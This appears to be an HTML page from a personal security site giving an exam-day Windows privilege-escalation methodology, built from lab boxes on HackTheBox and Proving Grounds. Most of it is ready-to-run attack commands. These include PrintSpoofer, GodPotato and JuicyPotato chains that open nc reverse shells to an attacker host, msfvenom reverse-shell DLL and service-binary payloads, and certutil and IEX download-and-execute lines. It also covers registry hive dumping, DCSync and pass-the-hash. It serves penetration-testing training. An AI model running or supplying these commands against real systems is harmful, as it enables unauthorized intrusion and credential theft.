@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Windows Privilege Escalation Methodology — Corey Clay</title>
+<meta name="description" content="The exam-day flow for Windows boxes — token privileges to Potato variants, group-membership abuse, service and DLL hijacks, credential mining, and the">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#14161b;--ink-2:#181b21;--panel:#1c2027;--panel-2:#20242c;
+    --line:#2c313b;--line-soft:#242932;
+    --fg:#e6e2d8;--fg-dim:#b7b6ae;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#e8a33d;--signal-soft:rgba(232,163,61,.14);--signal-line:rgba(232,163,61,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"Space Grotesk",system-ui,sans-serif;
+    --f-body:"Newsreader",Georgia,serif;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:17px;line-height:1.6;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+    background-image:
+      radial-gradient(1100px 520px at 82% -8%, rgba(232,163,61,.05), transparent 60%),
+      linear-gradient(var(--line-soft) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line-soft) 1px, transparent 1px);
+    background-size:auto,64px 64px,64px 64px;background-position:0 0,-1px -1px,-1px -1px;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background:linear-gradient(180deg,transparent 0%,var(--ink) 42%)}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(20,22,27,.86);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(20,22,27,.92);backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ windows-privesc</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a class="here" href="methodology.html" aria-current="page">methodology</a>
+      <a href="index.html#experience">experience</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="methodology.html">&larr; methodology</a> &nbsp;/&nbsp; foothold to SYSTEM</p>
+  <h1>Windows privesc methodology</h1>
+  <p>The exam-day flow for Windows boxes — token privileges to Potato variants, group-membership abuse, service and DLL hijacks, credential mining, and the token-to-SYSTEM chains ranked by frequency.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#prime-rules">Prime Rules</a>
+      <a href="#the-distilled-methodology">The Distilled Methodology</a>
+      <a href="#frequency-ranked-windows-privesc-vectors-htb-cpts-pg-evidence">Frequency-Ranked Windows Privesc Vectors (HTB CPTS + PG Evidence)</a>
+      <a href="#decision-tree-i-see-x-in-whoami-enum-try-y">Decision Tree — &quot;I See X in whoami/enum, Try Y&quot;</a>
+      <a href="#token-privilege-potato-canonical-chain-jacko-nagoya-authby">Token Privilege -&gt; Potato — Canonical Chain (Jacko/Nagoya/AuthBy)</a>
+      <a href="#semanagevolume-chain-access">SeManageVolume Chain (Access)</a>
+      <a href="#service-binary-replacement-fish-hepet">Service Binary Replacement (Fish, Hepet)</a>
+      <a href="#credential-mining-canonical-order">Credential Mining (Canonical Order)</a>
+      <a href="#key-exam-ready-one-liners">Key Exam-Ready One-Liners</a>
+      <a href="#opsec-cleanup-mandatory-for-oscp-report">OpSec + Cleanup (Mandatory for OSCP Report)</a>
+      <a href="#exam-restrictions">EXAM Restrictions</a>
+      <a href="#exam-day-windows-privesc-checklist">EXAM-Day Windows Privesc Checklist</a>
+  </div>
+</nav>
+<main class="wrap">
+<p>Exam-day flow for Windows privesc — synthesised from HTB CPTS Windows boxes (hospital, media, outdated, pov, and AD boxes) + PG Practice Windows boxes (Access, AuthBy, Craft, DVR4, Fish, Hepet, Internal, Jacko, Kevin, Medjed, Mice, Monster, Nagoya, Resourced).</p>
+<h2 id="prime-rules">Prime Rules</h2>
+<ol>
+<li><strong><code>whoami /priv</code> is the single highest-signal command.</strong> Token privileges (<code>SeImpersonate</code>, <code>SeAssignPrimaryToken</code>, <code>SeManageVolume</code>, <code>SeBackup</code>, <code>SeRestore</code>, <code>SeDebug</code>, <code>SeTakeOwnership</code>, <code>SeLoadDriver</code>) each map to a well-known escalation.</li>
+<li><strong><code>whoami /all</code> next</strong> — groups matter — <code>Backup Operators</code>, <code>Print Operators</code>, <code>Server Operators</code>, <code>Remote Desktop Users</code>, <code>DnsAdmins</code>, <code>Hyper-V Administrators</code>, <code>Event Log Readers</code> each map to a known privesc.</li>
+<li><strong>Config-level primitives before kernel exploits</strong> — kernel LPEs risk crashing the box.</li>
+<li><strong>Credentials over exploits</strong> — DPAPI, credential manager, PowerShell history, config files, LSASS all win frequently.</li>
+<li><strong>Automation-heavy modern Windows uses UAC + AV</strong> — reboot / logout may re-run installers or service watchers. Watch for those triggers.</li>
+<li><strong>PATH is stripped in service/H2/JNI shells</strong> — restore before diagnosis:</li>
+</ol>
+<p><code>cmd
+   set PATH=%SystemRoot%\system32;%SystemRoot%;</code></p>
+<hr />
+<h2 id="the-distilled-methodology">The Distilled Methodology</h2>
+<h3>Phase A — First 30 Seconds</h3>
+<pre><code class="language-cmd">whoami /priv                                                  :: token privileges (see rank #1)
+whoami /all                                                   :: groups + SIDs (see rank #2)
+systeminfo                                                    :: OS build, patches
+wmic qfe list                                                 :: patch list — feed to windows-exploit-suggester
+net user %USERNAME%                                           :: groups + password-set-date
+</code></pre>
+<h3>Phase B — Local Enumeration</h3>
+<pre><code class="language-cmd">:: WinPEAS (unlimited on OSCP):
+certutil -urlcache -f http://&lt;LHOST&gt;/winPEASx64.exe C:\Windows\Temp\wp.exe
+C:\Windows\Temp\wp.exe
+
+:: Or PowerShell PrivescCheck:
+IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/PrivescCheck.ps1')
+Invoke-PrivescCheck
+
+:: Manual keystones:
+tasklist /v                                                    :: process owners — SYSTEM services
+sc query                                                       :: service list
+sc qc &lt;SERVICE&gt;                                                :: binary path + start account
+schtasks /query /fo LIST /v                                    :: scheduled tasks
+Get-ChildItem &quot;C:\Program Files (x86)&quot; -Directory              :: non-standard 3rd-party apps = usually the win
+</code></pre>
+<h3>Phase C — Match Findings Against the Ranked Table</h3>
+<hr />
+<h2 id="frequency-ranked-windows-privesc-vectors-htb-cpts-pg-evidence">Frequency-Ranked Windows Privesc Vectors (HTB CPTS + PG Evidence)</h2>
+<table>
+<thead>
+<tr>
+<th>Rank</th>
+<th>Vector</th>
+<th>Evidence boxes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>Token privileges — SeImpersonate -&gt; Potato variants</strong></td>
+<td>pov, outdated, Jacko (GodPotato), Nagoya (PrintSpoofer -i chained from xp_cmdshell)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>Token privileges — SeManageVolume -&gt; SeManageVolumeAbuse -&gt; PrintConfig.dll drop -&gt; PrintNotify COM trigger</strong></td>
+<td>Access</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>JuicyPotato x86 with OS-specific CLSID</strong> — Server 2008-era</td>
+<td>AuthBy (feed known CLSID from ohpe list)</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>Weak service binary permissions</strong> — user-writable service exe -&gt; replace + restart</td>
+<td>Fish (locked exe -&gt; rename -&gt; replace -&gt; shutdown), Hepet (non-Microsoft auto-start service with user-writable binary)</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>Unquoted service paths</strong> — path split at spaces -&gt; payload in earlier segment</td>
+<td>(CPTS lab pattern; less common on modern PG/HTB)</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>AlwaysInstallElevated</strong> (HKLM+HKCU registry values = 1) -&gt; MSI -&gt; SYSTEM</td>
+<td>Some HTB (nibbles, granny)</td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>Weak service configuration</strong> — writable SC config via <code>sc config</code> — needs SeChangeNotify or SVC_CHANGE_CONFIG</td>
+<td>outdated (via Bitbucket-derived cred)</td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong>Registry AutoRun / RunOnce writable</strong></td>
+<td>(CPTS lab)</td>
+</tr>
+<tr>
+<td>9</td>
+<td><strong>AutoLogon creds in <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></strong></td>
+<td>pov, various</td>
+</tr>
+<tr>
+<td>10</td>
+<td><strong>Reversibly-encrypted app credential</strong> in config/ini</td>
+<td>DVR4 (<code>DVRParams.ini</code> — EDB 50130), Fish (GlassFish <code>admin-keyfile</code> SSHA256 -&gt; hashcat 1411)</td>
+</tr>
+<tr>
+<td>11</td>
+<td><strong>UAC-simulated admin trigger</strong> — replacing a config file the admin edits</td>
+<td>Monster (XAMPP <code>xampp-control.ini</code> Editor pref CVE-2020-11107)</td>
+</tr>
+<tr>
+<td>12</td>
+<td><strong>DPAPI decryption</strong> — user's credentials via <code>SharpDPAPI</code> / <code>mimikatz::dpapi</code></td>
+<td>Some HTB</td>
+</tr>
+<tr>
+<td>13</td>
+<td><strong>PowerShell history / console history</strong> in <code>%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></td>
+<td>Multiple</td>
+</tr>
+<tr>
+<td>14</td>
+<td><strong>Credential Manager</strong> (<code>cmdkey /list</code> + <code>runas /savecred</code>)</td>
+<td>pov, various</td>
+</tr>
+<tr>
+<td>15</td>
+<td><strong>FileZilla saved sessions</strong> (<code>recentservers.xml</code> base64)</td>
+<td>Mice</td>
+</tr>
+<tr>
+<td>16</td>
+<td><strong><code>Backup Operators</code> group</strong> — <code>reg save HKLM\SAM</code> + <code>HKLM\SYSTEM</code> -&gt; <code>secretsdump LOCAL</code></td>
+<td>Some HTB</td>
+</tr>
+<tr>
+<td>17</td>
+<td><strong>BarracudaDrive <code>bd.exe</code> WebDAV replace</strong> — service runs as SYSTEM</td>
+<td>Medjed (EDB 48789)</td>
+</tr>
+<tr>
+<td>18</td>
+<td><strong>Remote Mouse GUI LPE via elevated file dialog</strong> — Remote Desktop Users group</td>
+<td>Mice (EDB 50047)</td>
+</tr>
+<tr>
+<td>19</td>
+<td><strong>PHP webshell drop in xampp docroot -&gt; inherit apache's SeImpersonate</strong></td>
+<td>Craft (foothold user with no SeImpersonate -&gt; pivot to apache which has it)</td>
+</tr>
+<tr>
+<td>20</td>
+<td><strong><code>RunasCs</code> when WinRM denied but creds valid</strong> — user not in Remote Management Users</td>
+<td>Access</td>
+</tr>
+<tr>
+<td>21</td>
+<td><strong><code>psexec.exe -d</code> when interactive hangs</strong></td>
+<td>DVR4</td>
+</tr>
+<tr>
+<td>22</td>
+<td><strong>Kernel exploits</strong> — SweetPotato, PrintNightmare, EternalBlue, PetitPotam — LAST RESORT</td>
+<td>(CPTS)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="decision-tree-i-see-x-in-whoami-enum-try-y">Decision Tree — "I See X in whoami/enum, Try Y"</h2>
+<h3>Token Privileges (<code>whoami /priv</code>)</h3>
+<table>
+<thead>
+<tr>
+<th>Privilege</th>
+<th>Attack</th>
+<th>Tool</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SeImpersonatePrivilege</code></td>
+<td>Print Spooler -&gt; NamedPipe -&gt; duplicate SYSTEM token</td>
+<td><strong>PrintSpoofer</strong> (<code>ps.exe -i -c cmd.exe</code> chained from an existing shell — Nagoya), <strong>GodPotato</strong> (<code>-cmd "cmd /c ..."</code> — Jacko), <strong>JuicyPotato x86 with OS-specific CLSID</strong> for Server 2008 (AuthBy)</td>
+</tr>
+<tr>
+<td><code>SeAssignPrimaryTokenPrivilege</code></td>
+<td>Same as SeImpersonate</td>
+<td>Potato variants</td>
+</tr>
+<tr>
+<td><code>SeManageVolumePrivilege</code></td>
+<td>Grant Users FULL on <code>C:\Windows</code> -&gt; drop DLL in Print driver dir -&gt; COM trigger</td>
+<td><strong>SeManageVolumeAbuse</strong> + PrintConfig.dll + PrintNotify COM (Access)</td>
+</tr>
+<tr>
+<td><code>SeBackupPrivilege</code></td>
+<td>Read any file (SAM/SYSTEM/SECURITY hives)</td>
+<td><code>reg save HKLM\SAM C:\Temp\sam.bak</code>, <code>reg save HKLM\SYSTEM C:\Temp\sys.bak</code>, <code>secretsdump LOCAL</code></td>
+</tr>
+<tr>
+<td><code>SeRestorePrivilege</code></td>
+<td>Write any file including protected ones</td>
+<td>Combines with SeBackup</td>
+</tr>
+<tr>
+<td><code>SeTakeOwnershipPrivilege</code></td>
+<td>Take ownership of any object -&gt; grant self access</td>
+<td><code>takeown /F &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td><code>SeLoadDriverPrivilege</code></td>
+<td>Load an arbitrary signed driver — CVE-2020-14979 (Capcom driver etc.)</td>
+<td>Advanced; usually needs SE_LOAD_DRIVER + admin</td>
+</tr>
+<tr>
+<td><code>SeDebugPrivilege</code></td>
+<td>Inject into SYSTEM processes; token duplication via mimikatz</td>
+<td><code>mimikatz privilege::debug</code> + <code>sekurlsa::pth</code></td>
+</tr>
+<tr>
+<td><code>SeShutdownPrivilege</code></td>
+<td>Reboot only — but pairs with writable service exe (Fish)</td>
+<td><code>shutdown /r /t 0</code></td>
+</tr>
+</tbody>
+</table>
+<h3>Group Membership (<code>whoami /all</code>)</h3>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Attack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Administrators</strong></td>
+<td>Full — <code>psexec /system</code>, mimikatz. Already won</td>
+</tr>
+<tr>
+<td><strong>Backup Operators</strong></td>
+<td><code>reg save</code> hives -&gt; offline crack</td>
+</tr>
+<tr>
+<td><strong>Server Operators</strong></td>
+<td>Modify service config for existing service</td>
+</tr>
+<tr>
+<td><strong>Print Operators</strong></td>
+<td>Load / unload printer drivers -&gt; DLL load as SYSTEM</td>
+</tr>
+<tr>
+<td><strong>DnsAdmins</strong></td>
+<td>Load DLL via DNS server plugin</td>
+</tr>
+<tr>
+<td><strong>Event Log Readers</strong></td>
+<td>Read <code>Security.evtx</code> for cleartext creds in <code>TypedPassword</code></td>
+</tr>
+<tr>
+<td><strong>Hyper-V Administrators</strong></td>
+<td>Attach VHD -&gt; mount host FS</td>
+</tr>
+<tr>
+<td><strong>Remote Desktop Users</strong></td>
+<td>RDP + elevated file-dialog LPE (Mice EDB 50047)</td>
+</tr>
+<tr>
+<td><strong>Remote Management Users</strong></td>
+<td>WinRM <code>evil-winrm</code></td>
+</tr>
+</tbody>
+</table>
+<h3>Enumeration Signals</h3>
+<table>
+<thead>
+<tr>
+<th>Observation</th>
+<th>Response</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Non-standard <code>C:\Program Files (x86)\&lt;Vendor&gt;\</code> directory</td>
+<td>3rd-party app, likely misconfigured (BarracudaDrive Medjed, Argus DVR4, Veyon Hepet, Remote Mouse Mice)</td>
+</tr>
+<tr>
+<td><code>net start</code> shows non-Microsoft service</td>
+<td>Check <code>sc qc</code> for BINARY_PATH + START_ACCOUNT, <code>icacls</code> on the binary</td>
+</tr>
+<tr>
+<td><code>schtasks /query /v</code> shows a task running as SYSTEM with a user-writable script</td>
+<td>Hijack the script</td>
+</tr>
+<tr>
+<td>Cred-shaped strings in <code>type</code> of an INI/config file</td>
+<td>EDB the product name for a known cred-decode tool (Argus DVR EDB 50130)</td>
+</tr>
+<tr>
+<td><code>cmdkey /list</code> reveals a saved credential</td>
+<td><code>runas /savecred /user:&lt;USER&gt; cmd.exe</code></td>
+</tr>
+<tr>
+<td><code>type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></td>
+<td>Previous typed commands including passwords</td>
+</tr>
+<tr>
+<td><code>net user</code> shows account created recently or password-last-set is old</td>
+<td>Try password = username, <code>Password1</code>, <code>Welcome1</code></td>
+</tr>
+<tr>
+<td>PATH stripped in service/JNI shell</td>
+<td><code>set PATH=%SystemRoot%\system32;%SystemRoot%;</code> (Jacko)</td>
+</tr>
+<tr>
+<td><code>whoami</code> returns empty</td>
+<td>Same PATH issue; also try <code>c:\windows\system32\whoami.exe</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="token-privilege-potato-canonical-chain-jacko-nagoya-authby">Token Privilege -&gt; Potato — Canonical Chain (Jacko/Nagoya/AuthBy)</h2>
+<h3>PrintSpoofer (SeImpersonate — Server 2016-2019 mostly)</h3>
+<pre><code class="language-cmd">:: -c mangles quoted args — use -i (interactive) from an existing shell instead
+C:\Temp\PrintSpoofer64.exe -i -c cmd.exe                         :: chain from xp_cmdshell shell (Nagoya)
+
+:: Or classic:
+C:\Temp\PrintSpoofer64.exe -c &quot;C:\Temp\nc.exe &lt;LHOST&gt; &lt;LPORT&gt; -e cmd.exe&quot;
+</code></pre>
+<h3>GodPotato (SeImpersonate — Server 2019/Win11 where PrintNightmare surface is patched)</h3>
+<pre><code class="language-cmd">:: Runs one command as SYSTEM and exits — does NOT upgrade current shell!
+C:\Windows\Temp\GodPotato-NET4.exe -cmd &quot;cmd /c type C:\Users\Administrator\Desktop\proof.txt&quot;
+
+:: For a full SYSTEM shell:
+C:\Windows\Temp\GodPotato-NET4.exe -cmd &quot;C:\Windows\Temp\nc.exe &lt;LHOST&gt; &lt;LPORT&gt; -e cmd.exe&quot;
+</code></pre>
+<h3>JuicyPotato x86 (Server 2008)</h3>
+<pre><code class="language-cmd">certutil -urlcache -f http://&lt;LHOST&gt;:8000/Juicy.Potato.x86.exe jpx86.exe
+
+:: Default CLSID fails on 2008 — feed one from ohpe's Server_2008_Standard list:
+jpx86.exe -t * -l 1337 ^
+  -p C:\Windows\System32\cmd.exe ^
+  -a &quot;/c C:\Users\apache\Desktop\nc.exe -e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;&quot; ^
+  -c &quot;{4991d34b-80a1-4291-83b6-3328366b9097}&quot;
+</code></pre>
+<hr />
+<h2 id="semanagevolume-chain-access">SeManageVolume Chain (Access)</h2>
+<pre><code class="language-powershell">certutil -urlcache -f http://&lt;LHOST&gt;/SeManageVolumeExploit.exe slv.exe
+.\slv.exe        # BUILTIN\Users now has FULL on C:\Windows
+
+# Drop a payload into the Print driver dir SYSTEM Spooler will load:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f dll -o PrintConfig.dll
+copy /Y PrintConfig.dll C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll
+
+# PrintNotify COM trigger:
+$type = [Type]::GetTypeFromCLSID(&quot;{854A20FB-2D44-457D-992F-EF13785D2B51}&quot;)
+[Activator]::CreateInstance($type)
+</code></pre>
+<hr />
+<h2 id="service-binary-replacement-fish-hepet">Service Binary Replacement (Fish, Hepet)</h2>
+<h3>Locked exe Rename (Fish)</h3>
+<p>Service exe locked by running process; <code>sc stop</code> denied. Windows allows <strong>rename</strong> on locked files:</p>
+<pre><code class="language-cmd">cd C:\glassfish4\glassfish\domains\domain1\bin
+rename domain1Service.exe domain1Service.exe.orig
+copy C:\Users\&lt;USER&gt;\payload.exe domain1Service.exe
+shutdown /r /t 0
+</code></pre>
+<p><strong>Payload MUST be <code>msfvenom -f exe-service</code></strong> (SCM handshake — regular EXEs don't work):</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f exe-service -o domain1Service.exe
+</code></pre>
+<h3>Non-Microsoft Auto-Start Service (Hepet)</h3>
+<pre><code class="language-cmd">sc qc VeyonService                                             :: BINARY_PATH_NAME + SERVICE_START_NAME
+icacls &quot;C:\Users\&lt;USER&gt;\Veyon\veyon-service.exe&quot;               :: (F) = writable
+</code></pre>
+<pre><code class="language-powershell">move veyon-service.exe veyon-service.exe.bak
+certutil -urlcache -f http://&lt;LHOST&gt;/veyon-service.exe veyon-service.exe
+Restart-Service VeyonService                                    # or shutdown /r /t 0 if denied
+</code></pre>
+<hr />
+<h2 id="credential-mining-canonical-order">Credential Mining (Canonical Order)</h2>
+<ol>
+<li><code>whoami /priv</code> — token privileges</li>
+<li><code>whoami /all</code> — group membership</li>
+<li><code>cmdkey /list</code> + <code>runas /savecred</code></li>
+<li><code>type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>type %USERPROFILE%\.aws\credentials</code>, <code>.git-credentials</code>, <code>.npmrc</code></li>
+<li><code>type C:\ProgramData\&lt;Vendor&gt;\*.ini</code> (DVR4's DVRParams.ini pattern)</li>
+<li><code>type C:\Windows\System32\Sysprep\unattend.xml</code>, <code>sysprep.inf</code>, <code>Panther\unattend.xml</code></li>
+<li><code>type C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\*</code> (DPAPI blob)</li>
+<li><strong>PowerView / SharpDPAPI</strong> for domain-context DPAPI decryption</li>
+<li><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</code> (AutoLogon)</li>
+<li><strong>FileZilla <code>recentservers.xml</code></strong> (Mice — base64 passwords)</li>
+<li><code>type C:\inetpub\wwwroot\web.config</code> and every app config</li>
+</ol>
+<hr />
+<h2 id="key-exam-ready-one-liners">Key Exam-Ready One-Liners</h2>
+<h3>File Download</h3>
+<pre><code class="language-cmd">certutil -urlcache -f http://&lt;LHOST&gt;/tool.exe C:\Temp\tool.exe
+
+:: OR PowerShell:
+powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;/tool.ps1')&quot;
+
+:: OR bitsadmin:
+bitsadmin /transfer job /download /priority normal http://&lt;LHOST&gt;/tool.exe C:\Temp\tool.exe
+</code></pre>
+<h3>Reverse Shells (Payload-Agnostic)</h3>
+<pre><code class="language-bash"># Attacker:
+sudo nc -lvnp &lt;LPORT&gt;
+</code></pre>
+<pre><code class="language-cmd">:: Target (cmd variants):
+powershell -e &lt;B64&gt;                                        :: Base64 UTF-16LE (Billyboss)
+cmd /c &quot;nc.exe &lt;LHOST&gt; &lt;LPORT&gt; -e cmd.exe&quot;                 :: requires nc.exe
+</code></pre>
+<h3>PATH Fix (H2/JNI/Service Shells)</h3>
+<pre><code class="language-cmd">set PATH=%SystemRoot%\system32;%SystemRoot%;
+</code></pre>
+<h3>Password Hash Extraction (Backup Operators)</h3>
+<pre><code class="language-cmd">reg save HKLM\SAM C:\Temp\sam.bak
+reg save HKLM\SYSTEM C:\Temp\sys.bak
+reg save HKLM\SECURITY C:\Temp\sec.bak
+:: Exfil, then on attacker:
+impacket-secretsdump -sam sam.bak -system sys.bak -security sec.bak LOCAL
+</code></pre>
+<h3>DCSync via Impacket</h3>
+<pre><code class="language-bash">impacket-secretsdump &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;'@&lt;DC_IP&gt; -just-dc-ntlm
+</code></pre>
+<h3>Pass-the-Hash</h3>
+<pre><code class="language-bash">nxc smb &lt;IP&gt; -u Administrator -H &lt;NT-hash&gt;
+impacket-psexec -hashes :&lt;NT-hash&gt; Administrator@&lt;IP&gt;
+evil-winrm -i &lt;IP&gt; -u Administrator -H &lt;NT-hash&gt;
